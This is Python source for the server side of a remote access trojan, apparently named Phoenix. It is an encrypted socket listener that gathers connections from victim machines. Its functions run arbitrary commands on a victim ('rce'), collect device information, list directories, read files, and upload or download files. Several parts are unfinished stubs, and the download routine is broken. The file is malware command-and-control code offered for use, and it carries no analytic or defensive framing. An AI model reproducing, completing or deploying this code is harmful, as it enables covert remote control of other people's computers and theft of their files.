###########################################Imports#########################################
try:
    from sqlite3 import connect, OperationalError
    import socket
    from flask import *
    import os
    from rich.console import Console
    import time
    from pystyle import *
    from rich.progress_bar import ProgressBar
    import threading
    from cryptography.fernet import Fernet, InvalidToken
    from argparse import ArgumentParser
except ImportError:
    print("[ERROR] Not all required Modules are installed.")
    exit()
############################################Database########################################
conn = connect("db.sqlite3")
curr = conn.cursor()
try:
    curr.execute("SELECT * FROM Devices")
    curr.fetchall()
except:
    print("[ERROR] Database isnt configured.")
    exit()
###########################################Global Vars######################################
console = Console()
logo = Add.Add("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⠀⠀⠀⠀⠀⢀⣬⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⠀⠀⠀⠀⣬⣿⣯⣮⣌⣌⣌⢌⢈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⣿⠀⠀⠀⣸⣿⣿⠁⠀⠐⠑⠑⠳⡳⣷⣮⢌⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠀⠀⢀⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠐⠳⣷⣎⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⠈⠀⠀⣰⣿⣿⣿⠌⠀⣰⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣿⢎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣼⢏⠀⠀⡰⣿⣿⣿⣏⠀⠐⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣷⢎⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⣿⠌⠀⠀⣳⣿⣿⣿⢎⠀⡱⣿⣿⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⠎⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⢎⠀⠀⡳⣿⣿⣿⣎⠈⠱⣷⣯⠈⠀⠀⢀⠈⠀⠀⠀⠀⠀⠀⠀⠀⣱⣯⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡳⣿⣿⣯⢌⠈⠱⣷⣿⣿⣿⣎⢌⠘⠱⠀⠀⢈⣯⢌⠀⠀⠀⠀⠀⠀⠀⣰⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡀⠈⠀⠐⡳⣷⣿⣿⣯⣎⣽⣿⣿⣿⣿⣿⣿⣮⣮⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⣰⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣧⣮⣌⣌⢈⢙⢙⢹⣿⣿⣿⣿⣿⣿⡿⠳⠑⠁⠀⠑⠱⠀⠀⠀⠀⠀⠀⣾⠟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⢿⠳⡷⡷⣿⣿⣿⣿⣿⣿⣿⠓⣈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣷⣎⠀⠀⠀⠀⠀⣼⣿⣿⠟⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡳⣯⢌⠀⠀⠀⣿⣿⣿⣯⠀⣳⣏⠀⠀⠀⠀⠀⠀⢀⣬⣿⠗⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡳⣷⣎⣌⣿⣿⣿⣿⣏⠈⠱⣧⣌⠈⢈⣈⣮⡿⠓⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠱⡳⡷⣷⣿⣿⣯⣮⣾⡿⡷⠳⠓⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""", f"""

   ▄███████▄    ▄█    █▄     ▄██████▄     ▄████████ ███▄▄▄▄    ▄█  ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███   ███    ███ ███▀▀▀██▄ ███    ███▌   ████▀  
  ███    ███   ███    ███   ███    ███   ███    █▀  ███   ███ ███▌    ███  ▐███    
  ███    ███  ▄███▄▄▄▄███▄▄ ███    ███  ▄███▄▄▄     ███   ███ ███▌    ▀███▄███▀    
▀█████████▀  ▀▀███▀▀▀▀███▀  ███    ███ ▀▀███▀▀▀     ███   ███ ███▌    ████▀██▄     
  ███          ███    ███   ███    ███   ███    █▄  ███   ███ ███    ▐███  ▀███    
  ███          ███    ███   ███    ███   ███    ███ ███   ███ ███   ▄███     ███▄  
 ▄████▀        ███    █▀     ▀██████▀    ██████████  ▀█   █▀  █▀   ████       ███▄
{Box.DoubleCube("Made by Screamz2k")}""", 4, True)
port = 0000
mode = "http"
###########################################Functions#######################################
def log(text, style=None, justify="left"):
    console.print(text, style=style, justify=justify)
def ph_print(text):
    print(Colorate.Horizontal(Colors.yellow_to_red, text))
###########################################Classes##########################################
class Socket_Listener():
    def __init__(self, port):
        self.port = port
        self.setup(port)
    def decrypt(self, data):
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        return self.fernet.encrypt(data.encode())

    def refresh_connections(self):
        while True:
            if not threading.main_thread().is_alive():
                self.server.close()
                exit()
            for conn_i in self.connections:
                conn = conn_i[0]
                try:
                    conn.send(self.encrypt("alive:alive"))
                except:
                    self.connections.remove(conn_i)
            time.sleep(10)


    def rce(self, id, cmd):
        """Send a Cmd to Victim and return Output"""
        conn, addr = self.connections[id]
        conn.send(self.encrypt(f"CMD:{cmd}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def get_device_infos(self, id):
        conn, addr = self.connections[id]
        conn.send(self.encrypt(f"infos:"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output        
    def load_module(self, id, module):
        pass
    def execute_module(self, id, module):
        pass
    def get_directory_contents(self, id, dir):
        conn, addr = self.connections[id]
        conn.send(self.encrypt(f"dir:{dir}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output
    def get_file_contents(self, id, path):
        conn, addr = self.connections[id]
        conn.send(self.encrypt(f"content:{path}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output
    def start(self):
        self.server.listen()
        while True:
            conn, addr = self.server.accept()
            self.connections.append((conn, addr))
            conn.send(self.key)
            ph_print("[SUCCESS] New Connection initialised.")

    def setup(self, port):
        self.connections = []
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        SERVER = socket.gethostbyname(socket.gethostname())
        ADDR = (SERVER, port)

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.bind(ADDR)
        except:
            log("[ERROR] Port is already in use.", style="red")
            exit()
        threading.Thread(target=self.start).start()
        threading.Thread(target=self.refresh_connections).start()

    def file_upload(self, id, fil, path):
        conn, addr = self.connections[id]
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
            time.sleep(1)
            conn.sendfile(f)
            status = self.decrypt(conn.recv(1024))
            if status == "0":
                raise Exception
        except:
            return False
        else:
            return True
    def file_download(self, id, target_path, attacker_path):
        conn, addr = self.connections[id]
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-d:{target_path}"))
            fil = conn.recv(1024)
            if fil == "0":
                raise Exception
            with open(attacker_path, "wb") as f:
                f.write(fil)
        except:
            return False
        else:
            return True



class Http_Listener(Flask):
    pass
class Api(Flask):
    pass
class CLI():
    pass
###########################################Main############################################
if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("-p", default=9999, metavar="Port")
    parser.add_argument("-m", default="socket", metavar="Mode", choices=["socket", "http"])
    ph_print(logo)
    args = parser.parse_args()
    mode = args.m
    port = args.p 
    log(f"[INFO] Using {mode.upper()} Mode.", style="blue")
    log(f"[INFO] Starting Listener.", style="blue")
    Server = Socket_Listener(port)
    log(f"[SUCCESS] Listner started.", style="green")
    log(f"[INFO] Listening on Port {port}", style="blue")
